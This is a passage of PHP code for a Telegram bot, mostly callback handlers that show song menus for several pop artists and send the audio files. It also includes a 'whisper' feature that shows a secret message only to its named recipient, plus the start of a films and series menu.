 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="mallon4"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/626",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="mallon5"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/627",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="mallon6"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/628",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

 if($data=="siax" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
𓆩 𝚂𝙸𝙰 𓆪
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>'𝙲𝙷𝙰𝙽𝙳𝙴𝙻𝙸𝙴𝚁 🎵','callback_data'=>"siax1"]],
[['text'=>'𝚃𝙷𝙴 𝙶𝚁𝙴𝙰𝚃𝙴𝚂𝚃 🎵','callback_data'=>"siax2"]],
[['text'=>'𝚄𝙽𝚂𝚃𝙾𝙿𝙿𝙰𝙱𝙻𝙴 🎵','callback_data'=>"siax3"]],
[['text'=>'𝙲𝙷𝙴𝙰𝙿 𝚃𝙷𝚁𝙸𝙻𝙻𝚂 🎵','callback_data'=>"siax4"]],
[['text'=>'𝙸𝙼 𝚂𝚃𝙸𝙻𝙻 𝙷𝙴𝚁𝙴 🎵','callback_data'=>"siax5"]],
[['text'=>'𝙳𝚄𝚂𝙺 𝚃𝙸𝙻𝙻 𝙳𝙰𝚆𝙽 🎵','callback_data'=>"siax6"]],
[['text'=>'𝖇𝖆𝖈𝖐 🔙','callback_data'=>"song2"]],
]
])
]);
}

if($data=="siax1"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/598",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="siax2"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/599",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="siax3"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/600",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="siax4"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/601",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="siax5"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/602",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="siax6"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/603",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}


if($data=="justb" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
𓆩 𝙹𝚄𝚂𝚃𝙸𝙽𝙴 𝙱𝙸𝙱𝙴𝚁  𓆪
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>'𝐋𝐎𝐍𝐄𝐋𝐘 🎵','callback_data'=>"justb1"],['text'=>'𝐘𝗨𝐌𝐌𝐘 🎵','callback_data'=>"justb2"]],
[['text'=>'𝐇𝐎𝐋𝐘 🎵','callback_data'=>"justb3"],['text'=>'𝐈𝐍𝐓𝐄𝐍𝐓𝐈𝐎𝐍𝐒 🎵','callback_data'=>"justb4"]],
[['text'=>'𝐏𝐎𝐏 𝐒𝐓𝐀𝐑 🎵','callback_data'=>"justb5"],['text'=>'𝐒𝐎𝐑𝐑𝐘 🎵','callback_data'=>"justb6"]],
[['text'=>'𝐋𝐎𝐕𝐄 𝐘𝐎𝗨𝐑 𝐒𝐄𝐋𝐅 🎵','callback_data'=>"justb7"],['text'=>'𝐂𝐎𝐋𝐃 𝐖𝐀𝐓𝐄𝐑 🎵','callback_data'=>"justb8"]],
[['text'=>'𝐖𝐇𝐀𝐓 𝐃𝐎 𝐘𝐎𝗨 𝐌𝐄𝐀𝐍 🎵','callback_data'=>"justb9"],['text'=>'𝐂𝐎𝐌𝐏𝐀𝐍𝐘 🎵','callback_data'=>"justb10"]],
[['text'=>'𝐅𝐎𝐑 𝐄𝐕𝐄𝐑 🎵','callback_data'=>"justb11"]],
[['text'=>'𝖇𝖆𝖈𝖐 🔙','callback_data'=>"song2"]],
]
])
]);
}

if($data=="justb1"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/566",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="justb2"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/567",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="justb3"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/568",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="justb4"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/569",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="justb5"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/570",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="justb6"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/571",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="justb7"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/572",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="justb8"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/573",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="justb9"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/574",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="justb10"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/575",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="justb11"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/578",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="thsm" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
𓆩 𝚃𝙷𝙴 𝙲𝙷𝙰𝙸𝙽𝚂𝙼𝙾𝙺𝙴𝚁𝚂  𓆪
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>'𝙲𝙻𝙾𝚂𝙴𝚁 🎵','callback_data'=>"thsm1"],['text'=>'𝚂𝙾𝙼𝙴𝚃𝙷𝙸𝙽𝙶 𝙹𝚄𝚂𝚃 𝙻𝙸𝙺𝙴 🎵','callback_data'=>"thsm2"]],
[['text'=>'𝙳𝙾𝙽𝚃 𝙻𝙴𝚃 𝙼𝙴 𝙳𝙾𝚆𝙽 🎵','callback_data'=>"thsm3"],['text'=>'𝙸𝙻𝙻𝙴𝙽𝙸𝚄𝙼 🎵','callback_data'=>"thsm4"]],
[['text'=>'𝚂𝙸𝙲𝙺 𝙱𝙾𝚈 🎵','callback_data'=>"thsm5"],['text'=>'𝙷𝙾𝙿𝙴  🎵','callback_data'=>"thsm6"]],
[['text'=>'𝖇𝖆𝖈𝖐 🔙','callback_data'=>"song2"]],
]
])
]);
}

if($data=="thsm1"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/580",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="thsm2"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/581",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="thsm3"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/582",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="thsm4"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/583",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="thsm5"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/584",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="thsm6"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/585",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="maarroon" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
𓆩 𝙼𝙰𝚁𝙾𝙾𝙽 5  𓆪
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>'𝙼𝙴𝙼𝙾𝚁𝙸𝙴𝚂 🎵','callback_data'=>"maarroon1"]],
[['text'=>'𝙼𝙰𝙿𝚂 🎵','callback_data'=>"maarroon2"]],
[['text'=>'𝙶𝙸𝚁𝙻𝚂 𝙻𝙸𝙺𝙴 𝚈𝙾𝚄 🎵','callback_data'=>"maarroon3"]],
[['text'=>'𝚂𝚄𝙶𝙰𝚁 🎵','callback_data'=>"maarroon4"]],
[['text'=>'𝙿𝙰𝚈𝙿𝙷𝙾𝙽𝙴 🎵','callback_data'=>"maarroon5"]],
[['text'=>'𝙰𝙽𝙸𝙼𝙰𝙻𝚂 🎵','callback_data'=>"maarroon6"]],
[['text'=>'𝖇𝖆𝖈𝖐 🔙','callback_data'=>"song2"]],
]
])
]);
}

if($data=="maarroon1"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/586",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="maarroon2"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/591",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="maarroon3"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/587",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="maarroon4"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/588",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="maarroon5"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/589",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="maarroon6"){
 $editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/590",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="ellla" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
?? 𝙱𝙸𝙻𝙻𝙸𝙴 𝙴𝙸𝙻𝙸𝚂𝙷   𓆪
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>'𝙻𝙾𝚅𝙴𝙻𝚈 🎵','callback_data'=>"ellla1"]],
[['text'=>'𝚆𝙷𝙴𝙽 𝚃𝙷𝙴 𝙿𝙰𝚁𝚃𝚈 𝙾𝚅𝙴𝚁 🎵','callback_data'=>"ellla2"]],
[['text'=>'𝙱𝙴𝙻𝙻𝚈𝙰𝙲𝙷𝙴 🎵','callback_data'=>"ellla3"]],
[['text'=>'𝙱𝚄𝚁𝚈 𝙰 𝙵𝚁𝙸𝙴𝙽𝙳 🎵','callback_data'=>"ellla4"]],
[['text'=>'𝙰𝙻𝙻 𝚃𝙷𝙴 𝙶𝙾𝙾𝙳 𝙶𝙸𝚁𝙻𝚂 𝙶𝙾 𝚃𝙾 𝙷𝙴𝙻𝙻 🎵','callback_data'=>"ellla5"]],
[['text'=>'𝙱𝙰𝙳 𝙶𝚄𝚈 🎵','callback_data'=>"ellla6"]],
[['text'=>'𝖇𝖆𝖈𝖐 🔙','callback_data'=>"song2"]],
]
])
]);
}


if($data=="ellla1"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/592",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="ellla2"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/593",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="ellla3"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/594",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="ellla4"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/595",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="ellla5"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/596",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="ellla6"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/597",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="dragons" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
𓆩 𝙸𝙼𝙰𝙶𝙸𝙽𝙴 𝙳𝚁𝙰𝙶𝙾𝙽𝚂 𓆪
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>'𝙱𝙴𝙻𝙸𝙴𝚅𝙴𝚁 🎵','callback_data'=>"dragons1"]],
[['text'=>'𝙽𝙰𝚃𝚄𝚁𝙰𝙻 🎵','callback_data'=>"dragons2"]],
[['text'=>'𝚃𝙷𝚄𝙽𝙳𝙴𝚁 🎵','callback_data'=>"dragons3"]],
[['text'=>'𝚁𝙰𝙳𝙸𝙾𝙰𝙲𝚃𝙸𝚅𝙴 🎵','callback_data'=>"dragons4"]],
[['text'=>'𝙱𝙰𝙳 𝙻𝙸𝙰𝚁 🎵','callback_data'=>"dragons5"]],
[['text'=>'𝚆𝙷𝙰𝚃𝙴𝚅𝙴𝚁 𝙸𝚃 𝚃𝙰𝙺𝙴𝚂 🎵','callback_data'=>"dragons6"]],
[['text'=>' 𝖇𝖆𝖈𝖐 🔙','callback_data'=>"song2"]],
]
])
]);
}

if($data=="dragons1"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/604",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="dragons2"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/605",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="dragons3"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/606",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="dragons4"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/607",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="dragons5"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/608",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="dragons6"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/609",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}


if($data=="shern" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
𓆩 𝙴𝙳 𝚂𝙷𝙴𝙴𝚁𝙰𝙽 𓆪
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>'𝙿𝙴𝚁𝙵𝙴𝙲𝚃 🎵','callback_data'=>"shern1"]],
[['text'=>'𝚂𝙷𝙰𝙿𝙴 𝙾𝙵 𝚈𝙾𝚄  🎵','callback_data'=>"shern2"]],
[['text'=>'𝚃𝙷𝙸𝙽𝙺𝙸𝙽𝙶 𝙾𝚄𝚃 𝙻𝙾𝚄𝙳  🎵','callback_data'=>"shern3"]],
[['text'=>'𝙿𝙷𝙾𝚃𝙾𝙶𝚁𝙰𝙿𝙷 🎵','callback_data'=>"shern4"]],
[['text'=>'𝙳𝙸𝚅𝙴 🎵','callback_data'=>"shern5"]],
[['text'=>'𝙶𝙰𝙻𝚆𝙰𝚈 𝙶𝙸𝚁𝙻 🎵','callback_data'=>"shern6"]],
[['text'=>'𝙸 𝙳𝙾𝙽𝚃 𝙲𝙰𝚁𝙴 🎵','callback_data'=>"shern7"]],
[['text'=>'𝖇𝖆𝖈𝖐 🔙','callback_data'=>"song2"]],
]
])
]);
}

if($data=="shern1"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/610",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="shern2"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/611",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="shern3"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/612",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="shern4"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/613",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="shern5"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/614",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="shern6"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/615",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="shern7"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/616",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="puth" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
𓆩 𝙲𝙷𝙰𝚁𝙻𝙸𝙴 𝙿𝚄𝚃𝙷 𓆪
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>'𝙰𝚃𝚃𝙴𝙽𝚃𝙸𝙾𝙽 🎵','callback_data'=>"puth1"]],
[['text'=>'𝙷𝙾𝚆 𝙻𝙾𝙽𝙶  🎵','callback_data'=>"puth2"]],
[['text'=>'𝚆𝙴 𝙳??𝙽𝚃 𝚃𝙰𝙻𝙺 𝙰𝙽𝚈𝙼𝙾𝚁𝙴 🎵','callback_data'=>"puth3"]],
[['text'=>'𝙳𝙰𝙽𝙶𝙴𝚁𝙾𝚄𝚂𝙻𝚈 🎵','callback_data'=>"puth4"]],
[['text'=>'𝙾𝙽𝙴 𝙲𝙰𝙻𝙻 𝙰𝚆𝙰𝚈 🎵','callback_data'=>"puth5"]],
[['text'=>'𝚂𝙴𝙴 𝚈𝙾𝚄 𝙰𝙶𝙸𝙽𝙴  🎵','callback_data'=>"puth6"]],
[['text'=>'𝖇𝖆𝖈𝖐 🔙','callback_data'=>"song2"]],
]
])
]);
}

if($data=="puth1"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/617",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="puth2"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/618",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="puth3"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/619",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="puth4"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/620",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="puth5"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/621",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="puth6"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/622",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="hesel" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
𓆩 𝙷𝙰𝙻𝚂𝙴𝚈 𓆪
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>'𝙱𝙰𝙳 𝙰𝚃 𝙻𝙾𝚅?? 🎵','callback_data'=>"hesel1"]],
[['text'=>'𝚆𝙸𝚃𝙷𝙾𝚄𝚃 𝙼𝙴  🎵','callback_data'=>"hesel2"]],
[['text'=>'𝙱𝙴 𝙺𝙸𝙽𝙳 🎵','callback_data'=>"hesel3"]],
[['text'=>'𝚂𝙾𝚁𝚁𝚈 🎵','callback_data'=>"hesel4"]],
[['text'=>'𝙶𝚁𝙰𝚅𝙴𝚈𝙰𝚁𝙳 🎵','callback_data'=>"hesel5"]],
[['text'=>'𝙷𝙸𝙼 𝙰𝙽𝙳 𝙸 🎵','callback_data'=>"hesel6"]],
[['text'=>'𝖇𝖆𝖈𝖐 🔙','callback_data'=>"song2"]],
]
])
]);
}

if($data=="hesel1"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/629",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="hesel2"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/630",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="hesel3"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/631",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="hesel4"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/632",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="hesel5"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/633",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="hesel6"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/634",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
$update = json_decode(file_get_contents('php://input'));
if($update->message){
 $message = $update->message;
$message_id = $update->message->message_id;
$username = $message->from->username;
$chat_id = $message->chat->id;
$title = $message->chat->title;
$text = $message->text;
$user = $message->from->username;
$name = $message->from->first_name;
$from_id = $message->from->id;
}
function hmosa($array){
file_put_contents('hmsa.json', json_encode($array));
}
$data     = $update->callback_query->data; 
$inline   = $update->inline_query->query; 
$inlineid       = $update->inline_query->from->id; 
$msg_id   = $update->inline_query->inline_message_id; 
$save = json_decode(file_get_contents('hmsa.json'),true);
if($inline == "همسه") { 
    bot('answerInlineQuery',[ 
            'inline_query_id'=>$update->inline_query->id,     
            'results' => json_encode([[ 
                'type'=>'article', 
                'id'=>base64_encode(rand(5,555)), 
                'title'=>"اكتب الهمسه ثم معرف الشخص او الاشخاص", 
                  'description'=>"لشراء الكود @J_69_L", 
             'input_message_content'=>['parse_mode'=>'HTML','message_text'=>"لمزيد من التفاصيل @J_69_L"], 
          ]]) 
        ]); 
}
$kkykkn = $inline;
$ex = explode("@",$kkykkn);
if($inline){
$ex1 = explode(" ",$kkykkn);
$ex2 = count($ex1)-1;
$ex = $ex1[$ex2];
bot('answerInlineQuery',[ 
            'inline_query_id'=>$update->inline_query->id,     
            'results' => json_encode([[ 
                'type'=>'article', 
                'id'=>base64_encode(rand(5,555)), 
                'title'=>" 📩 همسة سرية الى  
{ $ex }", 
                  'description'=>"هـو فقـط مـن يستطـيع رويـتها", 
             'input_message_content'=>['message_text'=>"📩 همسة سرية الى 
{ $ex }"], 
            'reply_markup'=>['inline_keyboard'=>[ 
                [ 
                ['text'=>'📩اظهر الهمسة📩','callback_data'=>$inlineid.'&'.$ex] 
                ], 
             ]] 
          ]]) 
        ]);
}
if($update->chosen_inline_result->query){
$kkykkn = $update->chosen_inline_result->query;
$ex1 = explode(" ",$kkykkn);
$ex2 = count($ex1)-1;
$ex = $ex1[$ex2];
$h = str_replace($ex,"",$kkykkn);
$save[$update->chosen_inline_result->inline_message_id] = $h;
hmosa($save);
}
if($data){ 
$user = $update->callback_query->from->username;
$id = $update->callback_query->from->id;
$ex1 = str_replace("@","",$data);
    $ex = explode("&", $ex1);
    if(in_array($user,$ex) or in_array($id,$ex) or in_array($update->callback_query->from->id,$admins)){ 
        bot('answerCallbackQuery',[ 
            'callback_query_id'=>$update->callback_query->id, 
            'text'=>$save[$update->callback_query->inline_message_id], 
            'show_alert'=>true 
            ]); 
    } else{ 
if(preg_match("/(&)/", $data)){
        bot('answerCallbackQuery',[ 
            'callback_query_id'=>$update->callback_query->id, 
            'text'=>"الهمسة ليست لك 🤦‍♂️", 
            'show_alert'=>true 
            ]); 
}
    } 
    
}

if($text == 'الافلام' || $text == 'افلام' || $text == 'مسلسلات' || $text == 'المسلسلات'){ 
bot('sendMessage',[ 
'chat_id'=>$chat_id, 
'text'=>"
اختر النوع 🖤💥
. ", 
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>'مسلسلات 🎬','callback_data'=>"serii"]],
[['text'=>'افلام 📽','callback_data'=>"aflam2"]],
 [['text'=>'سورس ويزرد ™','url'=>'t.me/wizard _system']],
]
])
]);
}

if($data=="aflam" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
اختر النوع 🖤💥

',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>'مسلسلات 🎬','callback_data'=>"serii"]],
[['text'=>'افلام 📽','callback_data'=>"aflam2"]],
 [['text'=>'سورس ويزرد ™','url'=>'t.me/wizard _system']],
]
])
]);
}


if($data=="aflam2" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
اختر الفيلم 📽
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>'furious 7','callback_data'=>"aflam3"],['text'=>'furious 8','callback_data'=>"aflam4"]],
